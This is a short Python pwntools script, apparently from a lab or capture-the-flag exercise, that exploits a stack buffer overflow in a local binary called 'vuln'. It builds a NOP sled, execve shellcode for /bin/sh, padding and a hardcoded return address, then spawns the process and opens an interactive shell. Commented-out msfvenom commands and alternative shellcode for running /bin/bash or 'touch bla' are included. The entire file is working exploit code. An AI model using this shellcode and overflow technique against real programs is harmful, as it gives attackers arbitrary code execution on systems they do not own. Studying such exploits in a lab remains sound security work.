from pwn import p64,gdb,process, shellcraft, ELF

path = './vuln/vuln'

run_in_gdb = False

#craft base payload
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 

#shellcode with avoided charecters:
#msfvenom -p linux/x64/exec CMD="/bin/bash" -f c -b 0123456789
#shellcode =  b""
#shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
#shellcode += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0a"
#shellcode += b"\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
#shellcode += b"\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"

#shellcode with touch bla
#msfvenom -p linux/x64/exec CMD="touch bla" -f py -b 0123456789
#shellcode =  b""
#shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
#shellcode += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0a"
#shellcode += b"\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x62\x6c\x61"
#shellcode += b"\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"


nop = b'\x90' * 40

#patched the program with `printf("%p\n",buf)`; to recv the addr 
addr = p64(0x7fffffffdc10).replace(b'\x00',b'')
    
#complete payload
payload = (nop+ shellcode+b'A'*(9+(0xff-len(shellcode)-len(nop))) + addr)

#now spawns the shell
p= process([path, payload])
p.interactive()
p.close()